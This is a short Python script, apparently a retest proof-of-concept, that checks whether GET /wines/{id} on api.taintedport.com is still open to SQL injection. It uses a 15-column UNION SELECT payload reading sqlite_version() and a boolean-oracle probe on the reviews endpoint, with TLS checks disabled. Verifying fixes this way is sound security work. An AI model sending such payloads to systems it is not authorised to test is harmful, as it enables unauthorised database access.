     1	#!/usr/bin/env python3
     2	"""Verify: UNION-based SQL injection in GET /wines/{id}.
     3	
     4	Exits 0 if the injection is still exploitable (VULNERABLE), 1 otherwise.
     5	
     6	Optional (override defaults):
     7	    TARGET_URL   Base URL (default: https://api.taintedport.com)
     8	
     9	Usage:
    10	    python3 verify.py
    11	"""
    12	import os, sys, urllib.parse, requests, urllib3
    13	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    14	
    15	TARGET_URL = os.environ.get("TARGET_URL", "https://api.taintedport.com")
    16	
    17	
    18	def get_wine(payload):
    19	    url = f"{TARGET_URL}/wines/{urllib.parse.quote(payload, safe='')}"
    20	    r = requests.get(url, timeout=15, verify=False)
    21	    try:
    22	        return r.status_code, r.json()
    23	    except Exception:
    24	        return r.status_code, {}
    25	
    26	
    27	def check():
    28	    # 15-column UNION with sqlite_version() in the name column
    29	    payload = "0 UNION SELECT 1,sqlite_version(),3,4,5,6,7,8,9,10,11,12,13,14,15"
    30	    st, j = get_wine(payload)
    31	    wine = (j or {}).get("wine") or {}
    32	    version = str(wine.get("name", ""))
    33	
    34	    if st == 200 and j.get("success") and version.startswith("3."):
    35	        print(f"[VULNERABLE] UNION SELECT returned SQLite version "
    36	              f"{version!r} via GET /wines/{{id}} — path parameter is "
    37	              f"SQL-injectable")
    38	        sys.exit(0)
    39	
    40	    # Also test the sibling reviews endpoint (boolean oracle) as fallback
    41	    true_url  = f"{TARGET_URL}/wines/1%20AND%202=2/reviews"
    42	    false_url = f"{TARGET_URL}/wines/1%20AND%205=6/reviews"
    43	    t = requests.get(true_url,  timeout=15, verify=False)
    44	    f = requests.get(false_url, timeout=15, verify=False)
    45	    try:
    46	        tj = t.json(); fj = f.json()
    47	        t_has = bool(tj.get("reviews"))
    48	        f_has = bool(fj.get("reviews"))
    49	        if t_has and not f_has:
    50	            print("[VULNERABLE] Boolean oracle on GET /wines/{id}/reviews — "
    51	                  "TRUE returned reviews, FALSE returned empty list")
    52	            sys.exit(0)
    53	    except Exception:
    54	        pass
    55	
    56	    print(f"[NOT VULNERABLE] UNION probe on /wines/{{id}} did not reflect "
    57	          f"sqlite_version() (HTTP {st}, body: {str(j)[:200]})")
    58	    sys.exit(1)
    59	
    60	
    61	if __name__ == "__main__":
    62	    check()